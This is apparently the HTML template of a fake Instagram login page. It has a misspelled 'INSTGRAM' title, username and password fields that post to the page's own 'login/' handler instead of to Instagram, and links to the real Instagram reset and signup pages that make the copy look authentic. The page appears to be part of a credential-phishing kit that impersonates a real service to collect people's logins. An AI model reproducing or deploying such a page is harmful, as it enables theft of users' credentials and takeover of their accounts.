<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>INSTGRAM</title>
  
  <!-- HTML -->
  

  <!-- Custom Styles -->
  
  <link rel="stylesheet" href="/static/style.css">
</head>

<body>
  
<div class="container">
  <div class="box">
    <div class="heading"></div>
    <form class="login-form" method="POST" action="login/">
    {% csrf_token %}
      <div class="field">
        <input id="username" type="name" placeholder="Phone number, username, or email" name="username" required />
        <label for="username">Phone number, username, or email</label>
      </div>
      <div class="field">
        <input id="password" type="password" placeholder="password" name="password" required/>
        <label for="password">Password</label>
      </div>
      <!--<input class="login-button" type="submit" value="login">-->
      <button class="login-button" title="login" type="submit" name="submit">Log In</button> 
      <div class="separator">
        <div class="line"></div>
        <p>OR</p>
        <div class="line"></div>
      </div>
      <div class="other">
        <button class="fb-login-btn" type="button">
          <i class="fa fa-facebook-official fb-icon"></i>
          
        </button>
        <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
      </div>
    </form>
  </div>
  <div class="box">
    <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/signup/phone">Sign Up</a></p>
  </div>
</div>
</body>
</html>
